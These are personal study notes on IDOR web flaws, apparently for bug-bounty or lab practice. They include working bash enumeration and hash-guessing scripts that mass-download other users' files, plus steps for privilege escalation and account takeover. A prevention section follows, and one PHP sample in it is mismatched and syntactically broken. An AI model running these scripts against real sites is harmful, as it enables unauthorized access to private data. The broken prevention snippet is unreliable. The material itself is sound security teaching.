---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/insecure-direct-object-reference/","tags":["IDOR"]}
---

Also IDOR. Among the most common web vulnerabilities and can lead to unauthorized data access. They occur when a web application exposes a **direct reference** to an object, like a file or database resource.

This is prevalent because of lack of solid access control on the back end and exposure of direct reference to feils and resources. (e.g., if the application exposes information that suggest there is a sequential number used for labeling files.)

For example a user may get a link that goes to download.php?file_id=123.  This link directly references the file. If the user changes the link to ...file_id=124 this may access another file if there are not proper access control systems on the back-end.

The direct object reference on its own isn't a vulnerability, but it is a potential exploit when llinked with a weak access control system. This is the main takeaway. Good back-end access control esystems exist. A user with direct references to back-end objets shouldn't have the authorization to access them anyway.

But often developers ignore building the necessary access control system. This means that the web applications and mobile applications are unportected on the back and and vulnerable to direct object references.

## Impact of IDOR Vulnerabilities

The most basic is access to private files or other resources such as personal files or credit card data. This is known as IDOR Information disclosure vulnerabilities.

IDOR Vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user with IDOR Insecure Function Calls.

## Identifying IDORS

### URL Parameters & APIs

Whenever we get a resource or file, look at the request looking for URL Parameters or APIs with an object reference. (?uid=1 or ?filename=file_1.pdf)

### [[Cybersecurity/Bug Bounties/AJAX\|AJAX]] Calls

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls.

### Understand Hasing\/Encoding

Some websites will hash or encode the simple sequential numbers they use. If the encoding is something simple like base64, then we can try encoding different payloads with base64. If it is a hash function then we may find clues as to the hash used in the source code (if we can find it.)

### Compare User Roles

For more advanced IDOR attacks, use multiple registered users and compare their HTTP requests and object references.

## Mass IDOR Enumeration

### Insecure Paramters

Assume we know that a user has uid=1. If we see a folder that contains:
```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
We might conclude that there is a pattern \[uid\]\_month\_year.pdf that allows us to search for other files.

This is called a **static file IDOR**. 

We might also try changing the uid to see if that gives us other documents. It is common for web apps to suffer from IDOR vulnerabilities.

Once we see this kind of pattern, we can write a bash script to get all of the files. First we find the html for the links on the page:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
Then we curl the page and get the portion of the returned html that lists the documents:
```shell-session
user@computer $ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
And write a bash script to wget all of them:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## Bypassing Encoded References

Often we'll see a POST request to a download.php page. The file specifics may look like:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
The reference to the file object is not sent in cleartext in an attempt to protect it. This one is looks like an md5 hash. Hashes are one-way function so we cannot decode them to get their original values, but we can try and hash various values until we get a match.

**Burp Comparer** can help us fuzz various values and compare them to a target hash to try and see if we can get any matches. This is a **secure direct object reference**.

## Function Disclosure

Many modern web apps are developed using JavaScript frameworks like Angular, React, or Vue.js Some sensitive functions may be done on the front end, exposing them to attackers. If a hash is calculated on the front end we may be able to determine the encoding right away.
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
Here we see the function that is being used. btoa is the javascript function for converting the uid to to base64. It is then hashed to md5 and converted to a string.

We can replicate this: 
```shell-session
user@computer$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
The -n flag with echo and the -w 0 flag for base 64 are necessary to avoid adding newlines which would mess up the hash. (This is a mistake I made earlier this week.)

We can do something similar to the GET example above.
```shell-session
user@computer$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```
Then run the exploit.
```shell-session
user@computer$ bash ./exploit.sh
user@computer$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

## IDOR in Insecure APIs
IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls allow us to edecute functions as another user.

Let's say we're doing something like update our profile. It may do so with a PUT request to the API endpoint: `/profile/api.php/profile/1`
PUT requests are often used in APIs to update an item. (As opposed to a POST which creates a new item.)

It may use a JSON:
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```
This put request adds a few hidden parameters (uid, uuid) and the web application may be setting the role on the client's side via a line Cookie: role=employee. (That's in the captured BURP data.)

If there are no protections on the back end, we may be able to elevate our privileges by changing these values.

### Exploiting Insecure APIs
In the situation above, we may try and change a few things:
1. Change the uid to another uid.
2. Change another user's details, which may allow us to perform several web attacks.
3. Create new users with arbitrary details, or delete existing users.
4. Change our role to something more privileged (e.g., `admin`)

## Chaining IDOR Vulnerabilities
If there is an IDOR we may try and use that to leak information that will allow us to use that IDOR or some other object reference in manipulating the an API endpoint.

For example, we may be able to use a GET request with a disclosed object reference to find another reference that allows us further access into the system. This might be when we use a GET request to retrieve details from a `uid` to find a `uuid`. (These are just example objects.)

If we can get to the point where we can modify things like user emails we can change the email to one we control, then submit a password change request using that access and have access over the user's account.

## IDOR Prevention
Basically we need object-level access control and seure references for our objects when storing and calling them.

### Object-Level Access Control
A Role-Based Access Cnotrol #RBAC system should be used. Such a system would map the RBAC to all objects and resources. The back-end server can allow or deny every request depending on the role of the user and the privileges associated with that role and the privileges required to access the object.

Once the RBAC system is implemented each user is assigned a role that reflects their need for access. The sample code may be used to provide access control:
```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```
In this example the user has read write access only if the user is authorized and the user's uid matches the uid in the API endpoint they are requesting (or their role is admin.)

### Object Referencing
We should never use cleartext or simple patterns for object refernces. We should use salted hashes or uuids. We can use uuid v4 to generate a strongly randomized id or any element then map the uuid to the object it is referencing in the back=end.
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```
Also, never calculate hashes on the front end. Generate them when an object is created and store them in the back-end database. Then create database maps to enable quick cross-referencing of objets and references.

uuids may make it harder to detect IDOR vulnerabilities when testing. This is why strong referencing has to be the second step for IDOR prevention. (After robust RBAC.)

